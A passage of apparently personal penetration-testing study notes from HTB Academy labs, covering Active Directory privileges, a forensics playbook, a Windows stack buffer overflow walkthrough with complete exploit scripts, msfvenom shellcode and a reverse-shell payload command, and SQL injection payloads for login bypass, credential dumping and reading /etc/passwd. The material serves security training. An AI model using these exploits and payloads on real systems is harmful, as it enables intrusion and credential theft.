unlike local users.  One account to keep in mind is the KRBTGT account, this is a type of local account built into the AD infrastructure. It acts as a service account for the Key Distribution service providing authentication and access for domain resources. This account is a common target of many attackers since gaining control or access will enable an attacker to have unconstrained access to the domain.  ","version":"Next","tagName":"h3"},{"title":"Domain-joined vs. Non-Domain-joined Machines​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#domain-joined-vs-non-domain-joined-machines","content":" Domain joined: Hosts joined to a domain have greater ease of information sharing within the enterprise and a central management point (the DC) to gather resources, policies, and updates from. A host joined to a domain will acquire any configurations or changes necessary through the domain's Group Policy. Non-domain joined: Non-domain joined computers or computers in a workgroup are not managed by domain policy. The individual users are in charge of any changes they wish to make to their host.  It is important to note that a machine account (NT AUTHORITY\\SYSTEM level access) in an AD environment will have most of the same rights as a standard domain user account. Access in the context of the SYSTEM account will allow us read access to much of the data within the domain.  ","version":"Next","tagName":"h3"},{"title":"AD Groups​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#ad-groups","content":" After users, groups are another significant object in Active Directory. They can place similar users together and mass assign rights and access. The rights that they confer on their members may not be readily apparent but may grant excessive (and even unintended) privileges that can be abused if not set up correctly.  OUs are useful for grouping users, groups, and computers to ease management and deploying Group Policy settings to specific objects in the domain. Groups are primarily used to assign permissions to access resources.  Groups in Active Directory have two fundamental characteristics: type and scope. The group type defines the group's purpose, while the group scope shows how the group can be used within the domain or forest. When creating a new group, we must select a group type. There are two main types: security and distribution groups.  The Security groups type is primarily for ease of assigning permissions and rights to a collection of users instead of one at a time.  The Distribution groups type is used by email applications such as Microsoft Exchange to distribute messages to group members  There are three different group scopes that can be assigned when creating a new group.  Domain Local Group: only access resources in the domain the group was created.  Global Group: can access resources in another domain.  Universal Group: The universal group scope can be used to manage resources distributed across multiple domains and can be given permissions to any object within the same forest.  ","version":"Next","tagName":"h2"},{"title":"Nested Group Membership​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#nested-group-membership","content":" a Domain Local Group can be a member of another Domain Local Group in the same domain. Through this membership, a user may inherit privileges not assigned directly to their account or even the group they are directly a member of, but rather the group that their group is a member of. This can sometimes lead to unintended privileges granted to a user that are difficult to uncover without an in-depth assessment of the domain. Tools such as BloodHound are particularly useful in uncovering privileges that a user may inherit through one or more nestings of groups.  ","version":"Next","tagName":"h3"},{"title":"Active Directory Rights and Privileges​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-rights-and-privileges","content":" Rights are typically assigned to users or groups and deal with permissions to access an object such as a file, while privileges grant a user permission to perform an action such as run a program, shut down a system, reset passwords, etc. Privileges can be assigned individually to users or conferred upon them via built-in or custom group membership.  AD contains many default or built-in security groups, some of which grant their members powerful rights and privileges which can be abused. Some of them are listed below:  Group Name\tDescriptionAccount Operators\tMembers can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. They cannot manage the Administrator account, administrative user accounts, or members of the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Administrators\tMembers have full and unrestricted access to a computer or an entire domain if they are in this group on a Domain Controller. Backup Operators\tMembers can back up and restore all files on a computer, regardless of the permissions set on the files. Backup Operators can also log on to and shut down the computer. Members can log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, which, if taken, can be used to extract credentials and other juicy info. DnsAdmins\tMembers have access to network DNS information. The group will only be created if the DNS server role is or was at one time installed on a domain controller in the domain. Domain Admins\tMembers have full access to administer the domain and are members of the local administrator's group on all domain-joined machines. Domain Computers\tAny computers created in the domain (aside from domain controllers) are added to this group. Domain Controllers\tContains all DCs within a domain. New DCs are added to this group automatically. Domain Guests\tThis group includes the domain's built-in Guest account. Members of this group have a domain profile created when signing onto a domain-joined computer as a local guest. Domain Users\tThis group contains all user accounts in a domain. A new user account created in the domain is automatically added to this group. Enterprise Admins\tMembership in this group provides complete configuration access within the domain. The group only exists in the root domain of an AD forest. Members in this group are granted the ability to make forest-wide changes such as adding a child domain or creating a trust. The Administrator account for the forest root domain is the only member of this group by default. Event Log Readers\tMembers can read event logs on local computers. The group is only created when a host is promoted to a domain controller. Group Policy Creator Owners\tMembers create, edit, or delete Group Policy Objects in the domain. Hyper-V Administrators\tMembers have complete and unrestricted access to all the features in Hyper-V. If there are virtual DCs in the domain, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins. IIS_IUSRS\tThis is a built-in group used by Internet Information Services (IIS), beginning with IIS 7.0. Pre–Windows 2000 Compatible Access\tThis group exists for backward compatibility for computers running Windows NT 4.0 and earlier. Membership in this group is often a leftover legacy configuration. It can lead to flaws where anyone on the network can read information from AD without requiring a valid AD username and password. Print Operators\tMembers can manage, create, share, and delete printers that are connected to domain controllers in the domain along with any printer objects in AD. Members are allowed to log on to DCs locally and may be used to load a malicious printer driver and escalate privileges within the domain. Protected Users\tMembers of this group are provided additional protections against credential theft and tactics such as Kerberos abuse. Read-only Domain Controllers\tContains all Read-only domain controllers in the domain. Remote Desktop Users\tThis group is used to grant users and groups permission to connect to a host via Remote Desktop (RDP). This group cannot be renamed, deleted, or moved. Remote Management Users\tThis group can be used to grant users remote access to computers via Windows Remote Management (WinRM). Schema Admins\tMembers can modify the Active Directory schema, which is the way all objects with AD are defined. This group only exists in the root domain of an AD forest. The Administrator account for the forest root domain is the only member of this group by default. Server Operators\tThis group only exists on domain controllers. Members can modify services, access SMB shares, and backup files on domain controllers. By default, this group has no members.  Below there are listed some interesting user privileges:  Privilege\tDescriptionSeRemoteInteractiveLogonRight\tThis privilege could give our target user the right to log onto a host via Remote Desktop (RDP), which could potentially be used to obtain sensitive data or escalate privileges. SeBackupPrivilege\tThis grants a user the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file. SeDebugPrivilege\tThis allows a user to debug and adjust the memory of a process. With this privilege, attackers could utilize a tool such as Mimikatz to read the memory space of the Local System Authority (LSASS) process and obtain any credentials stored in memory. SeImpersonatePrivilege\tThis privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\\SYSTEM. This could be leveraged with a tool such as JuicyPotato, RogueWinRM, PrintSpoofer, etc., to escalate privileges on a target system. SeLoadDriverPrivilege\tA user with this privilege can load and unload device drivers that could potentially be used to escalate privileges or compromise a system. SeTakeOwnershipPrivilege\tThis allows a process to take ownership of an object. At its most basic level, we could use this privilege to gain access to a file share or a file on a share that was otherwise not accessible to us.  To see the user privileges, we can run:  PS C:\\htb&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled   If we enter the same command from an elevated PowerShell console, we can see the complete listing of rights available to us:  PS C:\\htb&gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======== SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeMachineAccountPrivilege Add workstations to domain Disabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Disabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Disabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Disabled SeCreatePagefilePrivilege Create a pagefile Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Disabled SeUndockPrivilege Remove computer from docking station Disabled SeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled SeCreateSymbolicLinkPrivilege Create symbolic links Disabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled  ","version":"Next","tagName":"h2"},{"title":"Digital Forensics and Incident Response","type":0,"sectionRef":"#","url":"/docs/Hacking/Playbooks/DFIR","content":"","keywords":"","version":"Next"},{"title":"auth.log and wtmp​","type":1,"pageTitle":"Digital Forensics and Incident Response","url":"/docs/Hacking/Playbooks/DFIR#authlog-and-wtmp","content":" The auth.log file is primarily used for tracking authentication mechanisms. Whenever a user attempts to log in, switch users, or perform any task that requires authentication, an entry is made in this log file. This includes activities involving sshd (SSH daemon), sudo actions, and cron jobs requiring authentication.  An example entry has been detailed below:  The entry above shows a failed password attempt for a user named &quot;admin&quot; on exampleserver from a source IP of 192.168.1.101 over port 22 (SSH).   auth.log is human readable.  The wtmp file logs all login and logout events on the system. It's a binary file, typically located at /var/log/wtmp . The last command can be used to read this file, providing a history of user logins and logouts, system reboots, and runlevel changes.  Since it's a binary file, it worth considering that the arch of the victim might be different from the arch of the researcher, so you might want to use some kind of script such as https://gist.github.com/4n6ist/99241df331bb06f393be935f82f036a5 to perform the research.  ","version":"Next","tagName":"h2"},{"title":"evtx​","type":1,"pageTitle":"Digital Forensics and Incident Response","url":"/docs/Hacking/Playbooks/DFIR#evtx","content":" Windows event logs are provided with evtx format. Is is a binary format, in order to read it and process it, you can use chainsaw and sigma-rules to detect possible threats.  https://github.com/WithSecureLabs/chainsaw a tool to search what happened inside Windows Forensic artifactshttps://github.com/SigmaHQ/sigma rules to detect threats  e.g:  ./chainsaw hunt ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller -s ~/workspace/tools/sigma --mapping mappings/sigma-event-logs-all.yml -r ~/workspace/tools/sigma/rules --csv --output ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller/chainsaw   and it can generate CSV output:  ./chainsaw hunt ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller -s ~/workspace/tools/sigma --mapping mappings/sigma-event-logs-all.yml -r ~/workspace/tools/sigma/rules --csv --output ~/workspace/gal/htb/Sherlocks/Campfire-1/Triage/Domain\\ Controller/chainsaw   ","version":"Next","tagName":"h2"},{"title":"prefetch files​","type":1,"pageTitle":"Digital Forensics and Incident Response","url":"/docs/Hacking/Playbooks/DFIR#prefetch-files","content":" Windows can be configured to generate a file the first time a binary is executed. This can be very helpful while collecting evidences of attacks. You can analyze them on a Windows machine using the following tools from https://ericzimmerman.github.io/#!index.md:  -PECmd: analyze the prefetch files and outputs a CSV:  .\\PECmd.exe -d C:\\Users\\gal\\Desktop\\campfire1\\Workstation\\2024-05-21T033012_triage_asset\\ --csv . --csvf C:\\Users\\gal\\Desktop\\prefetch.csv  Timeline Explorer: Load the generated CSV and it will display the CSV data visually. ","version":"Next","tagName":"h2"},{"title":"Stack based buffer overflow on Windows","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows","content":"","keywords":"","version":"Next"},{"title":"Stack overflow​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#stack-overflow","content":" The stack works in Least-In-First-Out mode: we can only remove from the stack (pop) the last inserted element (push). When we push an element to the stack, it will be in the top of the stack, when we pop, we pop from the top of the stack.  When we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at EIP,  This happens because of the LIFO design of the stack, which grows upwards, while a long string overflows values downwards until it eventually overwrites the return address EIP and the bottom of the stack pointer EBP.  Whenever a function is called, a new stack frame is created, and the old EIP address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished.  If we calculate our input precisely, we can place a valid address in the location where EIP is stored. This would lead the program to go to our overwritten address when it returns and subvert the program execution flow to an address of our choosing.  ","version":"Next","tagName":"h2"},{"title":"Debugging Windows Programs​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#debugging-windows-programs","content":" We need a debugger to follow the execution path and see the memory contents. An example of a good debugger is x64dbg. We can install ERC.Xdbg plugin to help us with binary exploitation techniques.  With x64dbg one can run a program from it, or attach the debugger to a running program.  ","version":"Next","tagName":"h2"},{"title":"Identify and fuzzing input fields​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#identify-and-fuzzing-input-fields","content":" Despite Linux applications, Windows applications are visual and might provide several inputs to the user. Maybe not all of them are vulnerable to the attack. Examples of potential inputs are:  Text input fieldsOpened filesProgram argumentsRemote resources  We should look for a field that expects a short input, like a field that sets the date, as the date is usually short so that the developers may expect a short input only.  Another common thing we should look for is fields that are expected to be processed somehow, like the license number registration field, as it will probably be run on a specific function to test whether it is a correct license number. The same applies to opened files, as opened files tend to be processed after being opened.  For example for fuzzing text input file, we can generate a long input with:  python -c &quot;print('A'*10000)&quot;   and pass it to the input, if the program crash, most likely it's because of buffer overflow.  If the application allows to load files, we can leverage a similar technique. One can write dummy data to a file and have it loaded in the application:  python -c &quot;print('A'*10000, file=open('fuzz.wav', 'w'))&quot;   When we open the file in the application, the application crash, which is a good sympton to spotting the vulnerability. When we do the same but with the process attached to the debugger, we see that the message indicates that the program tried to execute the address 41414141. In ASCII, the upper case A has hex code 0x41, so it looks like the program tried to go to address AAAA, which means that we have successfully changed the EIP address.  We can also check the registers in the debugger and we'll see EBP and EIP registers overwritten with 41414141.  ","version":"Next","tagName":"h2"},{"title":"EIP Offset​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#eip-offset","content":" Now we know the application is vulnerable to buffer overflow. Now we need to determine the exact offset we need to use to land in the EIP address.  In Linux, we'd use the metasploit create_pattern tool to create a pattern to observe which part gets into the EIP. In Windows, we can use the ERC plugin.  We can do it by executing ERC --pattern c 5000 in xdbg console, we'll see the result in the Log tab.  Now we need to write the pattern into a wav file and run the program. The EIP register will contain some value, that we need to retrieve in ASCII and then invoke ERC again with the value:  ERC --pattern o 1hF0   And this will return the value of the offset.  ","version":"Next","tagName":"h2"},{"title":"Controlling the EIP​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#controlling-the-eip","content":" Now we know exactly how many bytes we need to send in the input to arrive to the EIP, the next 4 bytes will be the value we write into the EIP. We can create a small python script that generates the payload and save it as a wav file.  def eip_control(): offset = 4112 buffer = b&quot;A&quot;*offset eip = b&quot;B&quot;*4 payload = buffer + eip with open('control.wav', 'wb') as f: f.write(payload) eip_control()   The next step is to run the program with this input and verify that we see 42424242 in the EIP register. (42 hex corresponds to B).  ","version":"Next","tagName":"h2"},{"title":"Bad characters​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#bad-characters","content":" Exactly in the sammer way of Linux, there are certain characters we shall avoid while building the shellcode. To do so, we can use ERC plugin:  ERC --bytearray   This creates two files on our Desktop:  ByteArray_1.txt: Which contains the string of all characters we can use in our python exploit ByteArray_1.bin: Which we can use with ERC later to compare with our input in memory.  Now, we can add the bad chars defined in the txt file into the payload script:  def bad_chars(): all_chars = bytes([ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, ...SNIP... 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF ]) offset = 4112 buffer = b&quot;A&quot;*offset eip = b&quot;B&quot;*4 payload = buffer + eip + all_chars with open('chars.wav', 'wb') as f: f.write(payload) bad_chars()   and generate the payload again and run the program. First, we make sure the EIP is overriden with the expected value. We can then get the top of the stack with the ESP register and invoke ERC again:  ERC --compare 0014F974 C:\\Users\\htb-student\\Desktop\\ByteArray_1.bin  Where 0014F974 is the value of ESP. The all chars data start at the top of the stack. The output compares the memory and all the chars available byte by byte. In the example, we see that after the first character, 00, all remaining bytes are different. This indicates that 0x00 truncated the remaining input, and hence it should be considered a bad character.  Now that we know the first bad character, we can repeat the process by specific the bad characters:  ERC --bytearray -bytes 0x00. This will generate again the two files but without the specified bad character. This should be repeated until all characters match.  ","version":"Next","tagName":"h2"},{"title":"Jumping to Stack​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#jumping-to-stack","content":" In order to find the address whose value we want to place in EIP. We can use a legacy method called Jumping to Stack. We'll redirect the EIP point to the top of the stack, and we'll place the shellcode directly in the input data. This is considered a legacy method because it will not work in modern machines. In order to do so, we can:  Write the ESP address in the EIP.Use a JMP ESP instruction.  Modern systems and programs are compiled with the NX bit on the stack or the DEP memory protection in Windows, which prevents executing any code written on the stack. So, even if we would write the shellcode on the stack, it would not be executable, nor would we find a JMP ESP instruction we can use within the program.  Writing the ESP address might not work because of the bad characters. It's more realiable to use the JMP ESP instruction. Any machine code in the program that contains the JMP ESP will be useful. We should search inside the program's exe file, the program's dll files or the OS dll files used by the program.  We can have such files by calling ERC --ModuleInfo.  Make sure the executables listed do not have any protection such as NXCompat, ASLR or Rebase.  Once we identified the viables files, we can go to the Symbols tag, double click in the file and search for the JMP ESP instruction. To search, just simply use CTRL+F and enter jmp esp.  As previously, we need to make sure the address does not contain any bad character.  Another example of a basic command to jump to the stack is PUSH ESP followed by RET. Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. We can use Online Assemblers, or the msf-nasm_shell tool to convert any assembly instructions to machine code. Both of these take an assembly instruction and give us the corresponding machine code.  Now, we can go to the CPU tab and search patterns using CTRL+B and enter the assembler code into the hex field. It's important to search for entire block!  ","version":"Next","tagName":"h2"},{"title":"Generating the shellcode​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#generating-the-shellcode","content":" We can use msfvenom to generate the shellcode. We can list our installed payload for windows with:  msfvenom -l payloads | grep windows   As a proof of concept, we can try to generate a shellcode that will execute the calculator:  msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\\x00'   Now that we have our shellcode, we can write the final payload that we'll write to the .wav file to be opened in our program. So far, we know the following:  buffer: We can fill the buffer by writing b&quot;A&quot;*offsetEIP: The following 4 bytes should be our return addressbuf: After that, we can add our shellcode.  In the previous section, we found multiple result address:  Directly ESP addressJMP ESP addressesPUSH ESP; RET addresses  To write the address in the script, we can use pack function and tell it to use little-endian:   eip = pack('&lt;L', 0x00419D0B)   Now that we have buffer and eip, we can add our shellcode after them and generate our .wav file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our JMP ESP instruction is executed, the top of the stack address ESP may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail.  To prevent this, we can add a few NOP bytes before our shellcode, which has the machine code 0x90. The stack alignment needed is usually not more than 16 bytes in most cases, and it may rarely reach 32 bytes. Since we have a lot of buffer space, we'll just add 32 bytes of NOP before our shellcode.  The final script to generate the payload is:  def exploit(): # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\\x00' shellcode = b&quot;&quot; ...SNIP... shellcode += b&quot;\\xfd\\x2c\\x39\\x51\\x60\\xbf\\xa1\\xb8\\x07\\x47\\x43\\xc5&quot; offset = 4112 buffer = b&quot;A&quot;*offset eip = pack('&lt;L', 0x00419D0B) nop = b&quot;\\x90&quot;*32 payload = buffer + eip + nop + shellcode with open('exploit.wav', 'wb') as f: f.write(payload) exploit()   Now, when we run the program and load the exploit.wav file, the calculator will open.  To gain code execution, we just need to replace calc.exe by cmd.exe. In order to get a reverse shell, we should select another payload for the shellcode:  # List all reverse shell payloads for windows msfvenom -l payloads | grep windows | grep reverse # Generate the shellcode msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'   ","version":"Next","tagName":"h2"},{"title":"Remote fuzzing​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#remote-fuzzing","content":" So far, we have been discussing about local buffer overflow. When it comes to remote, most of the parts are exactly the same, but the exploit construction is slightly different.  Let's imagine we have a program that listens in port 8888 and accepts an input via network. We can automate the process of crashing with it with a small python script:  import socket from struct import pack IP = &quot;127.0.0.1&quot; port = 8888 def fuzz(): try: for i in range(0,10000,500): buffer = b&quot;A&quot;*i print(&quot;Fuzzing %s bytes&quot; % i) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((IP, port)) s.send(buffer) breakpoint() s.close() except: print(&quot;Could not establish a connection&quot;) fuzz()   When the script is executed, it loops through all the range. However, in the debugger, we see the EIP register overwritten with A. This indicates that the networking part is not vulnerable to buffer overflow, however the user-facing program it is and must be processing the input somehow.  We can do this gradually by placing a breakpoint in the for loop to be able to give us some time to check the EIP register.  ","version":"Next","tagName":"h2"},{"title":"Building a remote exploit​","type":1,"pageTitle":"Stack based buffer overflow on Windows","url":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows#building-a-remote-exploit","content":" After fuzzing the listening port, the remaining buffer overflow identification and exploitation steps should be largely the same as local buffer overflow exploitation. The main steps we followed in previous sections were:  Fuzzing ParametersControlling EIPIdentifying Bad CharactersFinding a Return InstructionJumping to Shellcode  Next, we need to determine the offset to write to the EIP. We do that by sending the data in the same way as we have been fuzzing the parameters. Then, check the EIP can be override with different value, then find bad characters, then find a good return address and finally generate the shellcode.  The final exploit will be something like:  def exploit(): # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' buf = b&quot;&quot; ...SNIP... buf += b&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot; offset = 1052 buffer = b&quot;A&quot;*offset eip = pack('&lt;L', 0x0069D2E5) nop = b&quot;\\x90&quot;*32 payload = buffer + eip + nop + buf s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((IP, port)) s.send(payload) s.close() exploit()   We can change the payload to a reverse shell one and change the IP and port to effectively gain code execution over the remote server. ","version":"Next","tagName":"h2"},{"title":"SQL injections","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/SQL injections","content":"","keywords":"","version":"Next"},{"title":"Types of SQL injections​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#types-of-sql-injections","content":" In-band: The output of the query is printed directly in the frontend and we can read it.  We can have Union based SQL injections which we can pass the column to read and Error based where we leverage PHP or SQL errors to reveal the output of the query.  Blind: In this case, we cannot see the output of the query.  We can use Boolean logic in SQL or Time based queries, where the query is intentionally delayed using sleep under certain conditions.  Out-of-band: Sometimes, we don't have any access to the query output. In this case, we can forward the query results to an external system, e.g. DNS server.  ","version":"Next","tagName":"h2"},{"title":"Enumerating for SQL injections​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#enumerating-for-sql-injections","content":" First of all, we need to know if the input is vulnerable to SQLi. A good way to check this is to inject characters closely related to SQL in our input:  '\t-&gt; %27 &quot;\t-&gt; %22 #\t-&gt; %23 ;\t-&gt; %3B )\t-&gt; %29   Sometimes, we might need to use the url-encoded value of the character.  When we add this characters, we need to be observant to watch for any error or any other change in the application.  ","version":"Next","tagName":"h2"},{"title":"Subverting query logic​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#subverting-query-logic","content":" Let's image this SQL query:  SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';   If we introduce a ' char:  SELECT * FROM logins WHERE username=''' AND password = 'something';   We will see a Syntax error in the frontend and now we know this form is vulnerable to SQL injection.  ","version":"Next","tagName":"h2"},{"title":"OR injection​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#or-injection","content":" This simple query can be manipulated with the following payload:  admin' or '1'='1 which will result in the following query:  SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';   The logic of the query is changed, now it selects the username admin or the password something AND true, which will return False because we don't know the actual password.  username='admin' will evaluate to true when there's a username named admin.1'='1' AND password = 'something' the first part will evaluate to true always, the second part only when the password is the correct one; since we don't know it, it will evalute to false. True AND False will evaluate to False.  The OR operator will evaluate to true when one of the two components is true, so we'll completely bypass the authentication mechanism.  If we don't know the username, we can abuse in the same way of the password field:  SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1'='1';   ","version":"Next","tagName":"h3"},{"title":"Using comments​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#using-comments","content":" Just like any other language, SQL allows the use of comments as well. We can use # or -- to include comments.  mysql&gt; SELECT username FROM logins; -- Selects usernames from the logins table mysql&gt; SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'   If you introduce comments into the username, it will disable the part of the query that checks the password:  Setting username to admin'-- will create the following query:  SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';   And we'll have an auth bypass. Sometimes SQL queries use parenthesis which might need to be taken into account when generating the payload, for example:  SELECT * FROM logins WHERE (username='admin' AND id &gt; 1) AND password == &quot;e7df7cd2ca07f4f1ab415d457a6e1c13&quot;   If we input username as admin')-- we will disable the password part and close the parenthesis correctly:  SELECT * FROM logins WHERE (username='admin')-- AND id &gt; 1) AND password == &quot;e7df7cd2ca07f4f1ab415d457a6e1c13&quot;   and we'll have another auth bypass.  ","version":"Next","tagName":"h3"},{"title":"Union​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#union","content":" The union statement can be use to combine the fields coming from two separate selects. For example:  mysql&gt; SELECT * FROM ports; +----------+-----------+ | code | city | +----------+-----------+ | CN SHA | Shanghai | | SG SIN | Singapore | | ZZ-21 | Shenzhen | +----------+-----------+   and  mysql&gt; SELECT * FROM ships; +----------+-----------+ | Ship | city | +----------+-----------+ | Morrison | New York | +----------+-----------+ 1 rows in set (0.00 sec)   We can use union to combine both selects:  mysql&gt; SELECT * FROM ports UNION SELECT * FROM ships; +----------+-----------+ | code | city | +----------+-----------+ | CN SHA | Shanghai | | SG SIN | Singapore | | Morrison | New York | | ZZ-21 | Shenzhen | +----------+-----------+ 4 rows in set (0.00 sec)   The number of columns and data types of the combine data tables should be the same. For example:  mysql&gt; SELECT city FROM ports UNION SELECT * FROM ships; ERROR 1222 (21000): The used SELECT statements have a different number of columns   When the number of columns doesn't fit, you can just use a number to fill the missing columns.  We can use UNION as another source of injections. For example in the query:  SELECT * FROM products WHERE product_id = 'user_input'   We can enter the following payload:  1' UNION SELECT username, password from passwords--   which will end up in the following query:  SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '   and will reveal usernames and passwords.  If the number of columns are not the same, use the previous trick to make the query work:  UNION SELECT username, 2, 3, 4 from passwords-- '   mysql&gt; SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- ' +-----------+-----------+-----------+-----------+ | product_1 | product_2 | product_3 | product_4 | +-----------+-----------+-----------+-----------+ | admin | 2 | 3 | 4 | +-----------+-----------+-----------+-----------+   As seen in this example, we might need to know exactly the numbers of columns of a table. In order to do so, we can use ORDER BY statement:  ' order by 1-- -, we can keep up incrementing the number until the query fails to execute, then we found the number of columns.  We can use UNION itself to detect the number of columns, e.g:  cn' UNION select 1,2,3-- -. We add numbers until it works.  We also need to know which columns are printed into the application. We can inject junk data and see how it gets printed in the frontend, for example:  cn' UNION select 1,@@version,3,4-- -.  This way, we have found where we need to put our injection.  Once we have the SQL injection working, we can run some interesting queries:  mysql&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA; +--------------------+ | SCHEMA_NAME | +--------------------+ | mysql | | information_schema | | performance_schema | | ilfreight | | dev | +--------------------+ 6 rows in set (0.01 sec)   This finds all the available database in the server.  We can find the current database with SELECT database().  We can use information schema database and tables table to retrieve a list of all the available tables:  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  Here, we're using UNION SQL injection to dump all the tables available for the database dev.  A similar thing can be done to retrieve the columns of certain table:  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  This will list the columns of the table named credentials.  Now we can dump the data in the credentials table:  cn' UNION select 1, username, password, 4 from dev.credentials-- -  Note the dot operator: the application is using another database than dev. The dot operator is need to access other than the configured database.  ","version":"Next","tagName":"h3"},{"title":"Reading files​","type":1,"pageTitle":"SQL injections","url":"/docs/Hacking/HTB Academy/SQL injections#reading-files","content":" Under certain conditions databases might be able to read files.  The users have certain privileges configured, so first we need to gather which privileges the application user has.  First, we need to know what user is the application using to deal with the data:  cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -  Now we can determine the privileges of the user:  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -  cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=&quot;'root'@'localhost'&quot;-- -  If FILE privilege is granted, we can read files. Reading files cannot be simpler (if everything is setup correctly):  cn' UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -  This will dump the contents of /etc/passwd. We can dump the source code of the current php script as well:  cn' UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- -. The 